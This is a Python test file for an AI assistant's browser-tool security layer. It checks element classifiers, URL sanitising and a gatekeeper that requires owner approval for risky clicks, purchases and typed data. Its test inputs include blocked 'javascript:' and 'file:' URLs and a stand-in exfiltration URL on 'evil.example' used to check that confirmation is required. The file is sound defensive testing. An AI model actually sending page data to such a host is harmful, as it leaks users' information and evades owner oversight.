# tests/test_browser.py
import pytest

from jarvis.security import gatekeeper as gk_rules
from jarvis.security.audit import AuditLog
from jarvis.security.gatekeeper import Gatekeeper, classify
from jarvis.security.policy import DEFAULT_UNTRUSTED_TOOLS, Policy, Tier
from jarvis.tools.browser import elements as el
from jarvis.tools.browser.session import PageCache, normalize_url, safe_filename, search_url
from jarvis.tools.browser.tools import BROWSER_SCHEMAS, BROWSER_TOOL_NAMES


def E(**kw):
    base = {"index": 1, "tag": "button", "type": "", "role": "", "label": "", "href": "", "download": False,
            "attrs": "", "in_form": False, "form_role": "", "form_attrs": ""}
    base.update(kw)
    return base


# --- element rules ---

def test_password_and_payment_fields():
    assert el.is_password(E(tag="input", type="password"))
    assert el.is_password(E(tag="input", type="text", attrs="current-password"))
    assert el.is_payment(E(tag="input", attrs="cc-number"))
    assert el.is_payment(E(tag="input", attrs="otp one-time-code"))
    assert not el.is_payment(E(tag="input", attrs="q search"))


def test_search_boxes():
    assert el.is_search(E(tag="input", type="search"))
    assert el.is_search(E(tag="input", type="text", attrs="q"))
    assert el.is_search(E(tag="input", type="text", form_role="search"))
    assert not el.is_search(E(tag="input", type="text", attrs="email"))


@pytest.mark.parametrize("label", ["Buy now", "Place order", "Send", "Delete account", "Accept all",
                                   "Sign in", "Pay ₹499", "Subscribe"])
def test_risky_buttons(label):
    assert el.is_risky_action(E(tag="button", label=label))


@pytest.mark.parametrize("element", [
    E(tag="a", label="Laptops under 80k", href="https://example.com/laptops"),
    E(tag="button", label="Next page"),
    E(tag="input", type="submit", label="Search", in_form=True, form_role="search"),
    E(tag="input", type="text", label="Email"),
])
def test_ordinary_elements_are_not_risky(element):
    assert not el.is_risky_action(element)


def test_plain_form_submit_is_risky():
    assert el.is_risky_action(E(tag="input", type="submit", label="Continue", in_form=True))


def test_downloads():
    assert el.is_download(E(tag="a", href="https://x.com/setup.exe"))
    assert el.is_download(E(tag="a", href="https://x.com/file", download=True))
    assert not el.is_download(E(tag="a", href="https://x.com/page.html"))


def test_format_page_numbers_elements_and_marks_fields():
    text = el.format_page({"title": "Login", "url": "https://x.com/login", "text": "Welcome",
                           "elements": [E(index=1, tag="input", type="password", label="Password"),
                                        E(index=2, tag="button", label="Sign in")]})
    assert "[1] text field \"Password\" (password field — owner types it)" in text
    assert "[2] button \"Sign in\" (needs owner's click to use)" in text
    long = el.format_page({"title": "t", "url": "u", "text": "x" * 100, "elements": []}, max_chars=10)
    assert "cut at 10 characters" in long


def test_find_by_text():
    els = [E(index=1, label="Home"), E(index=2, label="Laptops under 80k"), E(index=3, label="laptops")]
    assert el.find_by_text(els, "laptops")["index"] == 3        # exact match wins
    assert el.find_by_text(els, "under 80")["index"] == 2
    assert el.find_by_text(els, "nothing") is None


# --- session helpers ---

def test_normalize_url_only_web():
    assert normalize_url("youtube.com") == "https://youtube.com"
    assert normalize_url("https://a.b/c?d=1") == "https://a.b/c?d=1"
    for bad in ["file:///C:/x.exe", "javascript:alert(1)", r"C:\x.exe", "ms-settings:", "notes"]:
        assert normalize_url(bad) is None, bad


def test_search_url_and_filenames():
    assert search_url("best laptops <80k") == "https://duckduckgo.com/?q=best+laptops+%3C80k"
    assert search_url("x", "google").startswith("https://www.google.com/search?q=")
    assert safe_filename('a<b>:c?.zip') == "a_b__c_.zip"
    assert safe_filename("...") == "download"


def test_page_cache():
    now = [0.0]
    c = PageCache(ttl_s=60, clock=lambda: now[0])
    c.put("u", "text", [1])
    assert c.get("u") == ("text", [1])
    now[0] += 61
    assert c.get("u") is None
    c.put("u", "t2", [])
    c.invalidate("u")
    assert c.get("u") is None


def test_schemas_match_names():
    assert [s["function"]["name"] for s in BROWSER_SCHEMAS] == BROWSER_TOOL_NAMES


# --- gatekeeper tiers ---

@pytest.fixture
def inspector():
    elements = {1: E(index=1, tag="a", label="Result"),
                2: E(index=2, tag="button", label="Buy now"),
                3: E(index=3, tag="input", type="search", label="Search"),
                4: E(index=4, tag="input", type="password", label="Password"),
                5: E(index=5, tag="input", type="text", attrs="email", label="Email"),
                6: E(index=6, tag="a", href="https://x.com/setup.exe", label="Download")}
    gk_rules.BROWSER_INSPECTOR = lambda tool, args: elements.get(args.get("index"))
    yield
    gk_rules.BROWSER_INSPECTOR = None


def _p():
    return Policy(free_paths=[], blocked_paths=[], untrusted_tools=set(DEFAULT_UNTRUSTED_TOOLS))


def test_browser_tiers(inspector):
    p = _p()
    assert classify("browser_open", {"url": "example.com"}, p)[0] == Tier.FREE
    assert classify("browser_open", {"url": "file:///C:/x.exe"}, p)[0] == Tier.NEVER
    assert classify("browser_read", {}, p)[0] == Tier.FREE
    assert classify("browser_click", {"index": 1}, p)[0] == Tier.FREE
    assert classify("browser_click", {"index": 2}, p)[0] == Tier.STRONG
    assert classify("browser_click", {"index": 6}, p)[0] == Tier.CONFIRM
    assert classify("browser_click", {"index": 99}, p)[0] == Tier.CONFIRM
    assert classify("browser_type", {"index": 3, "value": "laptops", "submit": True}, p)[0] == Tier.FREE
    assert classify("browser_type", {"index": 4, "value": "hunter2"}, p)[0] == Tier.NEVER
    assert classify("browser_type", {"index": 5, "value": "a@b.c"}, p)[0] == Tier.CONFIRM
    assert classify("browser_type", {"index": 5, "value": "a@b.c", "submit": True}, p)[0] == Tier.STRONG
    assert classify("browser_hack", {}, p)[0] == Tier.NEVER


def test_reading_a_page_needs_one_ok_before_clicking(inspector, tmp_path):
    p = _p()
    p.audit_db = str(tmp_path / "a.db")
    asked = []
    gk = Gatekeeper(policy_loader=lambda: p, confirmer=lambda r: asked.append(r.reason) or True, audit=AuditLog(p.audit_db))
    turn = gk.new_turn("voice")
    run = lambda tool, args: gk.run(turn, tool, args, lambda t, a: f"ran {t}")
    assert run("browser_search", {"query": "laptops"}) == "ran browser_search"
    assert run("browser_click", {"index": 1}) == "ran browser_click"
    assert run("browser_type", {"index": 3, "value": "more"}) == "ran browser_type"
    assert len(asked) == 1 and "click and type" in asked[0]
    run("browser_click", {"index": 2})                       # Buy now: asked on its own
    assert len(asked) == 2 and "buys" in asked[1]
    run("browser_open", {"url": "evil.example/steal?data=x"})  # opening a URL after reading: asked on its own
    assert len(asked) == 3
